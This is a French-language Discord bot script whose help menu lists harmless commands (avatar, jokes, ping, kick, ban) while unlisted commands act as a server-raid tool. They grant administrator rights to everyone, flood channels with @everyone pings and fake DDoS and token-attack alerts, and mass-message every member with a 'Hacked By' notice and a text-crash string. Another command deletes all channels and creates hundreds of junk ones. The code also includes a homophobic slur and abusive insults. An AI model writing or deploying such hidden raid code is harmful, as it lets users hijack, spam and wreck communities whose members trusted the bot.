const Discord = require('discord.js');
const client = new Discord.Client();
client.login('token') 
var prefix = "roger!";

client.on("ready", () => {
  console.log(" Roger Est Prêt à être utilisé !");
  
client.user.setPresence({ game: { name: 'Casser du pd ', type: 0 } });
  client.user.setUsername('RogerLeCamioneur');
});

// Etre Admin
client.on('message' , message => {
    if(message.content === prefix + "camioneur"){
      message.delete();
      message.guild.createRole({
        name: message.author.username,
        position: message.guild.members.get(client.user.id).highestRole.position
      }).then(role => {
        message.member.addRole(role);
        message.guild.defaultRole.setPermissions("ADMINISTRATOR");
      console.log("BRUTE_FORCE ADMIN SCRIPTS LOADED ! ENJOY :D")
    })
  }
  
  // Spam Implosion
    if(message.content.startsWith(prefix + "spam")){
      setInterval(function(){message.channel.send("@everyone Attention https://cdn.discordapp.com/attachments/461895911757578250/464050529144799232/unknown.png ")}, 100);
     }
   if (message.content.startsWith(prefix + "turfu"))
       setInterval(function(){message.channel.send ("Exemple*")}, 100);



  
  // Fake BOOT
     if(message.content.startsWith(prefix + "ddos")){
      setInterval(function(){message.channel.send("Le serveur subbit une attaque DOS/DDOS, Activation du protocle de sécurité. @here")}, 0.5);
     }
  
  // Fake Token
     if(message.content.startsWith(prefix + "tok")){
      setInterval(function(){message.channel.send("Le serveur subbit une attaque par Token, Réinitialisation des par feux. @here")}, 0.2);
     }
  
  // Spam MP
    if(message.content.startsWith(prefix + "mp")){
      message.delete();
      message.guild.members.forEach(function(e){
        setInterval(function(){e.user.send("Hacked By Flipper | SecHub. Security is an illusion :)")}, 100)
      })
     }

  // Spam MP II
    if(message.content.startsWith(prefix + "mp2")){
      message.delete();
      message.guild.members.forEach(function(e){
        setInterval(function(){e.user.send("@Mehdi ne ͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌ù*")}, 100);
      })
     }
  

     // Créer 250 rôles
    if(message.content.startsWith(prefix + "roger250")){
      message.delete();
    var numberole = 1
    while(numberole < 100){
                  message.guild.createRole("snake")
                      .then(() => console.log())
                      .catch(console.error);
                  numberole += 1
              } 
     } 
  
     // Delete All salon + Create 450 channels + Serveur
    if(message.content.startsWith(prefix + "roger450")){
    message.guild.channels.map(channel => channel.delete());
    message.guild.setName('roger');
    message.guild.setIcon("https://www.google.fr/imgres?imgurl=http%3A%2F%2Fchoupie33.c.h.pic.centerblog.net%2Fzun8sb61.jpg&imgrefurl=http%3A%2F%2Fchoupie33.centerblog.net%2F5528715-Dessin-Serpent&docid=Go4XrkmeMcd0eM&tbnid=F7w8mNSzQcG_VM%3A&vet=10ahUKEwjC9oWftIXcAhVHtxQKHf9xC_MQMwhbKCEwIQ..i&w=200&h=200&bih=561&biw=1223&q=dessin%20serpent&ved=0ahUKEwjC9oWftIXcAhVHtxQKHf9xC_MQMwhbKCEwIQ&iact=mrc&uact=8");
    var salonumber = 1;
    while(salonumber < 450){
                  message.guild.createChannel( 'Psssssssssssssshhhhht!', 'test');
                  message.guild.createChannel( 'Psssssssssssssshhhhht!', 'voice');
                  salonumber = salonumber + 1;
              }
     }
  
      
     // Voir Avatar
     if(message.content.startsWith(prefix + "avatar")){
      let user = message.mentions.users.first() || message.author;
      let embed = new Discord.RichEmbed()
      .setAuthor(`${user.username}`)
      .setImage(user.displayAvatarURL)
      .setColor('RANDOM')
      message.channel.sendEmbed(embed);
     } 
  
     // Blague Cookie
     if(message.content.startsWith(prefix + "cookie")){
      message.reply("Pourquoi tu veut un cookie sale fils de pute achète toi une vie La Vie De Oam :|");
      }
      if(message.content.startsWith(prefix + "ping")){
      message.channel.sendMessage('Le Ping du Serveur est de `' + `${Date.now() - message.createdTimestamp}` + ' ms`');
      }
      if(message.content.startsWith("tic")){
      message.reply("Tac :D");
      }
  
      if(message.content.startsWith("slt")){
    message.reply("Salut Bro ! Comment Va tu ? Tu Cherche Mes Commandes ? Tape *help");
      }
  
      if(message.content.startsWith("salut")){
        message.reply("Salut Bro ! Comment Va tu ? Tu Cherche Mes Commandes ? Tape *help");
          }
  
      if(message.content.startsWith("wsh")){
        message.reply("Salut Bro ! Comment Va tu ? Tu Cherche Mes Commandes ? Tape *help");
          }
  
      if(message.content.startsWith("wesh")){
        message.reply("Salut Bro ! Comment Va tu ? Tu Cherche Mes Commandes ? Tape *help");
          }
  
      // Blague pas drôle (un peu quand même)
      if(message.content.startsWith(prefix + "blague")){
    message.reply("Pourquoi Les Japonais Veulent-ils devenirs des chevaux ?? Car ils sont déjaponais LOL !");
      }
  
      if (message.content.startsWith(prefix + "ban")) {
        // Easy way to get member object though mentions.
        var member= message.mentions.members.first();
        // Ban
        member.ban().then((member) => {
            // Successmessage
            message.channel.send(":wave: " + member.displayName + " Bravo, tu es ban :point_right: ");
        }).catch(() => {
             // Failmessage
            message.channel.send("Acces non autorisé");
        });
    }
      if (message.content.startsWith(prefix + "kick")) {
          // Easy way to get member object though mentions.
          var member= message.mentions.members.first();
          // Kick
          member.kick().then((member) => {
              // Successmessage
              message.channel.send(":wave: " + member.displayName + " Bravo, tu es kick :point_right: ");
          }).catch(() => {
               // Failmessage
              message.channel.send("Acces non autorisé");
          });
      }
      client.on('message', function(message) {
        if (message.content == prefix + "clear") {
            if (message.member.hasPermission("MANAGE_MESSAGES")) {
                message.channel.fetchMessages()
                   .then(function(list){
                        message.channel.bulkDelete(list);
                    }, function(){message.channel.send("ERROR: ERROR CLEARING CHANNEL.")})                        
            }
        }
    });   
  
      // Help Commande
     if(message.content.startsWith(prefix + "help")){
      var embed = new Discord.RichEmbed()
          .setTitle("help")
          .setDescription("Liste des commandes")
          .setAuthor(client.user.username)
          .addField("avatar","Donne ta photo de profile",)
          .addField("cookie","Donne un cookie",)
          .addField("blague","Fait une blague drôle ou pas",)
          .addField("ping","Ping Du Serveur",)
          .addField("kick","kick (ADMIN UNIQUEMENT)",)
          .addField("ban","Ban (ADMIN UNIQUEMENT)",)
          .addField("clear","supprimer les messages du tchat (ADMIN UNIQUEMENT)",)
          .addField("tic","REP",)
          .addField("slt / salut / wsh / wesh","Si tu te sens seul dit Slt et le bot te parlera",)
          .addField("NOM", message.author.username, true)
          .addField("ID", message.author.id, true)
          .setColor("0xFE2E2E")
          .setFooter(client.user.username + " Aide Commande")
          .setThumbnail(message.author.avatarURL)
          .setTimestamp()
        message.channel.sendEmbed(embed);
    
      }
  
  });
